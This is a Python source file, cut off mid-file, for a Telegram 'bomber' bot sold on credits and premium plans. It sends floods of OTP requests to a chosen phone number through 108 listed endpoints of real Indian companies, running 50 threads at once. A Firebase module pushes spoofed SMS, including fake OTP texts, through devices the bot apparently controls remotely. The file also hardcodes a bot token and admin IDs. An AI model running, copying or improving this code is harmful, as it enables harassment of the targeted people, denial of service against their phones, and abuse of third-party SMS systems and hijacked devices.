#!/usr/bin/env python3
# WARRIOR BOMBER BOT - FINAL
# By Warrior X Technical White Hat

import asyncio, json, os, random, threading, time, datetime, logging, re, sqlite3, string
from concurrent.futures import ThreadPoolExecutor

import requests
from requests.adapters import HTTPAdapter
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import RetryAfter, TelegramError
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, filters, CallbackQueryHandler
)

# ===================== LOGGING =====================
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
    handlers=[logging.FileHandler("bot.log"), logging.StreamHandler()]
)
log = logging.getLogger("bomber")

# ===================== CONFIG =====================
BOT_TOKEN = "8842615934:AAHJwUGHomdRepfUdyAm_i2Wlx3czsNpPts"
OWNER_ID = 8490612097
ADMIN_IDS = [8864524240, 5887312294]

SUPPORT_USERNAME = "@RealZeroXSupport"
SUPPORT_LINK = "https://t.me/RealZeroXSupport"
CHANNEL_USERNAME = "@ExploitLabX"
CHANNEL_LINK = "https://t.me/ExploitLabX"

DEFAULT_COUNTRY_CODE = "91"

# ⚡ MAX SPEED + SAFE
THREAD_COUNT = 50
RANDOM_DELAY = 0.01
CUSTOM_DELAY = 0.005
STATUS_UPDATE_INTERVAL = 2
AUTO_REFRESH_SEC = 180
MAX_CONCURRENT_HANDLERS = 100
MAX_GLOBAL_WORKERS = 200

# 🎯 ATTACKS / CREDITS
FREE_ATTACKS = 2
REFILL_HOURS = 12
REFILL_SECONDS = REFILL_HOURS * 3600

# ===================== SMALL CAPS =====================
SMALL_CAPS = {
    'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ',
    'j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ',
    's':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ',
    'A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ꜰ','G':'ɢ','H':'ʜ','I':'ɪ',
    'J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ',
    'S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ',
}

def sc(text):
    return "".join(SMALL_CAPS.get(c, c) for c in str(text))

# ===================== APIs (108) =====================
APIS = [
  {"name": "Agrevolution", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Breeze", "url": "https://api.breeze.in/session/start", "method": "POST", "headers": {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8"}},
  {"name": "Jockey", "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "PW Live", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "KPN Fresh", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3", "method": "POST", "headers": {"x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json; charset=UTF-8"}},
  {"name": "Aditya Birla", "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "GoPaySense", "url": "https://api.gopaysense.com/users/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "BankOpen", "url": "https://v2-api.bankopen.co/users/register/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Tata Capital", "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "TradeIndia", "url": "https://apis.tradeindia.com/app_login_api/login_app", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Orange Health", "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Jobhai", "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}},
  {"name": "AstroSage", "url": "https://varta.astrosage.com/sdk/registerAS", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Spinny", "url": "https://api.spinny.com/api/c/user/otp-request/v3/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Dream11", "url": "https://www.dream11.com/auth/passwordless/init", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "CityMall", "url": "https://citymall.live/api/cl-user/auth/get-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Bella Vita", "url": "https://api.codfirm.in/api/customers/login/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Oyo", "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "method": "POST", "headers": {"Content-Type": "text/plain;charset=UTF-8"}},
  {"name": "Myma", "url": "https://portal.myma.in/custom-api/auth/generateotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Freedo", "url": "https://api.freedo.rentals/customer/sendOtpForSignUp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Licious", "url": "https://www.licious.in/api/login/signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Bisleri", "url": "https://apis.bisleri.com/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Evital", "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "QuickRide", "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Kwikfix", "url": "https://admin.kwikfixauto.in/api/auth/signupotp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Brevistay", "url": "https://www.brevistay.com/cst/app-api/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Hourly Rooms", "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Pagarbook", "url": "https://api.pagarbook.com/api/v5/auth/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Vahak", "url": "https://api.vahak.in/v1/u/o_w", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Redcliffe", "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Ixigo", "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Testbook", "url": "https://api.testbook.com/api/v2/mobile/signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Medibuddy", "url": "https://loginprod.medibuddy.in/unified-login/user/register", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Beyoung", "url": "https://www.beyoung.in/api/sendOtp.json", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}},
  {"name": "Wrogn", "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Medkart", "url": "https://app.medkart.in/api/v1/auth/requestOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Coverfox", "url": "https://www.coverfox.com/otp/send/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "GoMechanic", "url": "https://gomechanic.app/api/v2/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Lovelocal", "url": "https://homedeliverybackend.mpaani.com/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Udaan", "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Xylem", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "NoBroker V1", "url": "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "WoodenStreet", "url": "https://api.woodenstreet.com/api/v1/register", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Foxy", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Stratzy", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Eka Care", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Univest", "url": "https://api.univest.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Hyuga Auth", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Lifestyle", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "WorkIndia", "url": "https://api.workindia.in/api/candidate/profile/login/verify-number/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Vyapar", "url": "https://vyaparapp.in/api/ftu/v3/send/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "TooTou", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "ConfirmTkt", "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Nuvama", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Mpokket", "url": "https://api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Flipkart", "url": "https://www.flipkart.com/api/6/user/signup/status", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Practo", "url": "https://accounts.practo.com/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Ajio", "url": "https://www.ajio.com/api/auth/signupSendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "AltBalaji", "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Grab", "url": "https://api.grab.com/grabid/v1/phone/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Delhivery", "url": "https://direct.delhivery.com/delhiverydirect/order/generate-otp", "method": "GET", "headers": {}},
  {"name": "ConfirmTkt Reg", "url": "https://securedapi.confirmtkt.com/api/platform/register", "method": "GET", "headers": {}},
  {"name": "Goibibo", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "MakeMyTrip", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}}
]

# ===================== SAFE GLOBALS =====================
_user_semaphore = asyncio.Semaphore(MAX_CONCURRENT_HANDLERS)
_global_executor = ThreadPoolExecutor(max_workers=MAX_GLOBAL_WORKERS)
bombing_active = {}
bombing_threads = {}
request_counts = {}
active_bombings_detail = {}
counter_lock = threading.Lock()
_join_cache = {}
_join_lock = threading.Lock()
_fb_failures = {}
_fb_lock = threading.Lock()
firebase_cache = {}
# ===================== DATABASE =====================
DB_PATH = "bomber.db"

def db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=30.0, isolation_level=None)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA busy_timeout=30000")
    conn.execute("PRAGMA cache_size=10000")
    return conn

def init_db():
    conn = db(); c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
        free_attacks_used INTEGER DEFAULT 0,
        last_refill_at REAL DEFAULT 0,
        credits INTEGER DEFAULT 0,
        is_premium INTEGER DEFAULT 0,
        premium_type TEXT,
        premium_expires_at REAL DEFAULT 0,
        referrer_id INTEGER, referral_count INTEGER DEFAULT 0,
        joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS banned_users (user_id INTEGER PRIMARY KEY)''')
    c.execute('''CREATE TABLE IF NOT EXISTS protected_numbers (number TEXT PRIMARY KEY)''')
    c.execute('''CREATE TABLE IF NOT EXISTS blacklist (number TEXT PRIMARY KEY)''')
    c.execute('''CREATE TABLE IF NOT EXISTS force_channels (id TEXT PRIMARY KEY, label TEXT, url TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS firebases (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT UNIQUE, tag TEXT, added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS activity_history (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, action TEXT, details TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (
        code TEXT PRIMARY KEY, credits INTEGER, max_uses INTEGER,
        used_count INTEGER DEFAULT 0, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        created_by INTEGER
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, user_id INTEGER,
        credits INTEGER, used_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    c.execute("INSERT OR IGNORE INTO config (key, value) VALUES ('maintenance', '0')")
    conn.commit(); conn.close()

init_db()

# ===================== DB HELPERS =====================
def get_config(key, default="0"):
    conn = db(); c = conn.cursor()
    c.execute("SELECT value FROM config WHERE key = ?", (key,))
    r = c.fetchone(); conn.close()
    return r[0] if r else default

def set_config(key, value):
    conn = db(); c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)", (key, str(value)))
    conn.commit(); conn.close()

def get_user(uid):
    conn = db(); c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (uid,))
    row = c.fetchone(); conn.close()
    if not row: return None
    keys = ["user_id","username","first_name","free_attacks_used","last_refill_at",
            "credits","is_premium","premium_type","premium_expires_at",
            "referrer_id","referral_count","joined_at"]
    return dict(zip(keys, row))

def create_user(uid, username="", first_name="", referrer_id=None):
    conn = db(); c = conn.cursor()
    c.execute("""INSERT OR IGNORE INTO users 
        (user_id, username, first_name, referrer_id, last_refill_at)
        VALUES (?, ?, ?, ?, ?)""",
        (uid, username, first_name, referrer_id, time.time()))
    conn.commit(); conn.close()

def update_user(uid, **fields):
    if not fields: return
    conn = db(); c = conn.cursor()
    keys = ", ".join(f"{k} = ?" for k in fields)
    values = list(fields.values()) + [uid]
    c.execute(f"UPDATE users SET {keys} WHERE user_id = ?", values)
    conn.commit(); conn.close()

def is_banned(uid):
    conn = db(); c = conn.cursor()
    c.execute("SELECT 1 FROM banned_users WHERE user_id = ?", (uid,))
    r = c.fetchone(); conn.close()
    return r is not None

def is_protected(num):
    conn = db(); c = conn.cursor()
    c.execute("SELECT 1 FROM protected_numbers WHERE number = ?", (num,))
    r = c.fetchone(); conn.close()
    return r is not None

def is_blacklisted(num):
    conn = db(); c = conn.cursor()
    c.execute("SELECT 1 FROM blacklist WHERE number = ?", (num,))
    r = c.fetchone(); conn.close()
    return r is not None

def is_admin(uid): return uid in ADMIN_IDS
def is_owner(uid): return uid == OWNER_ID
def has_admin_access(uid): return uid == OWNER_ID or uid in ADMIN_IDS

def log_activity(uid, action, details=""):
    conn = db(); c = conn.cursor()
    c.execute("INSERT INTO activity_history (user_id, action, details) VALUES (?, ?, ?)",
              (uid, action, details))
    conn.commit(); conn.close()

def get_activity(uid, limit=10):
    conn = db(); c = conn.cursor()
    c.execute("SELECT action, details, created_at FROM activity_history WHERE user_id = ? ORDER BY id DESC LIMIT ?",
              (uid, limit))
    rows = c.fetchall(); conn.close()
    return rows

def get_firebases():
    conn = db(); c = conn.cursor()
    c.execute("SELECT url, tag FROM firebases")
    rows = c.fetchall(); conn.close()
    return [{"url": r[0], "tag": r[1]} for r in rows]

def get_force_channels():
    conn = db(); c = conn.cursor()
    c.execute("SELECT id, label, url FROM force_channels")
    rows = c.fetchall(); conn.close()
    return [{"id": r[0], "label": r[1], "url": r[2]} for r in rows]

# ===================== SESSION (POOLED) =====================
_tls = threading.local()

def get_session():
    if not hasattr(_tls, "session"):
        s = requests.Session()
        adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1, pool_block=False)
        s.mount("http://", adapter); s.mount("https://", adapter)
        s.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
                          "Accept": "application/json, text/plain, */*"})
        _tls.session = s
    return _tls.session

# ===================== PREMIUM / ATTACKS =====================
def is_premium_active(uid):
    u = get_user(uid)
    if not u: return False
    if not u.get("is_premium"): return False
    exp = u.get("premium_expires_at", 0) or 0
    if exp == 0: return True  # lifetime
    return exp > time.time()

def get_free_attacks_left(uid):
    if has_admin_access(uid): return 999999
    if is_premium_active(uid): return 999999
    u = get_user(uid)
    if not u: return FREE_ATTACKS
    return max(0, FREE_ATTACKS - u.get("free_attacks_used", 0))

def get_credits(uid):
    u = get_user(uid)
    return u.get("credits", 0) if u else 0

def check_free_refill(uid):
    u = get_user(uid)
    if not u: return
    if has_admin_access(uid) or is_premium_active(uid): return
    now = time.time()
    last = u.get("last_refill_at", 0) or 0
    if last == 0:
        update_user(uid, last_refill_at=now); return
    if now - last >= REFILL_SECONDS:
        update_user(uid, free_attacks_used=0, last_refill_at=now)

def get_refill_countdown(uid):
    u = get_user(uid)
    if not u: return "12ʜ 0ᴍ"
    last = u.get("last_refill_at", 0) or 0
    if last == 0: return "12ʜ 0ᴍ"
    remaining = max(0, REFILL_SECONDS - (time.time() - last))
    h = int(remaining // 3600); m = int((remaining % 3600) // 60)
    return f"{h}ʜ {m}ᴍ"

# ===================== BOMBING DEDUCTION =====================
def deduct_attack_or_credit(uid):
    """
    Returns (success, message)
    - Premium/Admin: no deduction
    - Free attacks left: deduct free
    - Credits available: deduct credit
    - Nothing: fail
    """
    if has_admin_access(uid) or is_premium_active(uid):
        return (True, "unlimited")
    
    u = get_user(uid)
    if not u: return (False, "no_user")
    
    check_free_refill(uid)
    u = get_user(uid)  # refetch after refill
    
    free_used = u.get("free_attacks_used", 0)
    free_left = max(0, FREE_ATTACKS - free_used)
    credits = u.get("credits", 0)
    
    if free_left > 0:
        update_user(uid, free_attacks_used=free_used + 1)
        return (True, "free")
    elif credits > 0:
        update_user(uid, credits=credits - 1)
        return (True, "credit")
    else:
        return (False, "no_attacks")

# ===================== RANDOM API =====================
def _build_payload(url, phone, cc):
    u = (url or "").lower()
    if "khatabook" in u: return {"country_code": f"+{cc}", "phone": phone, "app_signature": "Jc/Zu7qNqQ2"}
    if "agrevolution" in u: return {"mobile_number": phone, "client_id": "kisan-app"}
    if "penpencil" in u or "xylem" in u: return {"mobile": phone, "organizationId": "5eb393ee95fab7468a79d189"}
    if "nuvama" in u: return {"contactInfo": phone, "mode": "SMS"}
    if "jockey" in u: return {"mobile": phone, "country_code": f"+{cc}"}
    if "breeze" in u:
        return {"phoneNumber": phone, "authVerificationType": "otp",
                "device": {"id": "A1pKVEDhlv66KLtoYsml3", "platform": "Chrome", "type": "Desktop"},
                "countryCode": f"+{cc}"}
    return {"phone": phone, "mobile": phone, "phoneNumber": phone, "mobileNumber": phone,
            "contactNumber": phone, "country_code": cc, "countryCode": cc}

def call_api(api, phone, cc="91"):
    try:
        url = api["url"]; method = api.get("method", "POST").upper()
        headers = dict(api.get("headers", {}))
        payload = _build_payload(url, phone, cc)
        s = get_session(); ct = headers.get("Content-Type", "").lower()
        if method == "GET":
            r = s.get(url, headers=headers, params=payload, timeout=5)
        elif "json" in ct:
            r = s.post(url, headers=headers, json=payload, timeout=5)
        else:
            r = s.post(url, headers=headers, data=payload, timeout=5)
        return r.status_code in (200, 201, 202, 204)
    except Exception:
        return False

def random_otp_worker(uid, target, cc="91"):
    avail = list(range(len(APIS)))
    while bombing_active.get(uid):
        if not avail: avail = list(range(len(APIS)))
        idx = random.choice(avail)
        ok = call_api(APIS[idx], target, cc)
        with counter_lock:
            request_counts[uid] = request_counts.get(uid, 0) + 1
        if uid in active_bombings_detail:
            active_bombings_detail[uid]["requests"] = request_counts.get(uid, 0)
        if not ok and idx in avail: avail.remove(idx)
        time.sleep(RANDOM_DELAY)

# ===================== FIREBASE =====================
def is_fb_alive(tag):
    with _fb_lock:
        f, t = _fb_failures.get(tag, (0, 0))
        if f >= 5 and time.time() - t < 300: return False
        return True

def mark_fb_failure(tag):
    with _fb_lock:
        f, _ = _fb_failures.get(tag, (0, 0))
        _fb_failures[tag] = (f + 1, time.time())

def mark_fb_success(tag):
    with _fb_lock:
        _fb_failures.pop(tag, None)

def fetch_firebase_stats(url):
    try:
        r = get_session().get(f"{url.rstrip('/')}/clients.json", timeout=6)
        if r.status_code != 200: return None
        data = r.json()
        if not data or not isinstance(data, dict):
            return {"online": 0, "offline": 0, "total": 0}
        on = off = 0
        for d, i in data.items():
            if isinstance(i, dict) and i.get("status") is True: on += 1
            else: off += 1
        return {"online": on, "offline": off, "total": on + off}
    except Exception:
        return None

def firebase_custom_worker(uid, target, message, max_count):
    firebases = get_firebases()
    if not firebases: return
    s = get_session(); sent = [0]; sent_lock = threading.Lock()
    while bombing_active.get(uid) and sent[0] < max_count:
        for fb in firebases:
            if not bombing_active.get(uid): break
            if sent[0] >= max_count: break
            if not is_fb_alive(fb["tag"]): continue
            fb_url = fb["url"].rstrip("/")
            try:
                r = s.get(f"{fb_url}/clients.json", timeout=3)
                if r.status_code != 200:
                    mark_fb_failure(fb["tag"]); continue
                clients = r.json()
                if not clients or not isinstance(clients, dict): continue
                mark_fb_success(fb["tag"])
            except Exception:
                mark_fb_failure(fb["tag"]); continue
            online = [d for d, i in clients.items() if isinstance(i, dict) and i.get("status") is True]
            for dev_id in online:
                if not bombing_active.get(uid): break
                if sent[0] >= max_count: break
                msg = message
                if "{otp}" in msg:
                    otp = str(random.randint(100000, 999999))
                    msg = msg.replace("{otp}", otp)
                payload = {"sim": 1, "to": target, "message": msg, "isSended": False}
                try:
                    s.put(f"{fb_url}/clients/{dev_id}/webhookEvent/sendSms.json", json=payload, timeout=2)
                    with sent_lock: sent[0] += 1
                    with counter_lock: request_counts[uid] = request_counts.get(uid, 0) + 1
                    if uid in active_bombings_detail:
                        active_bombings_detail[uid]["requests"] = request_counts.get(uid, 0)
                except Exception: pass
                time.sleep(CUSTOM_DELAY)

# ===================== SAFE SEND =====================
async def safe_send(bot, chat_id, text, **kwargs):
    try: return await bot.send_message(chat_id=chat_id, text=text, **kwargs)
    except RetryAfter as e:
        await asyncio.sleep(e.retry_after + 1)
        try: return await bot.send_message(chat_id=chat_id, text=text, **kwargs)
        except Exception: return None
    except Exception: return None

# ===================== FORCE JOIN =====================
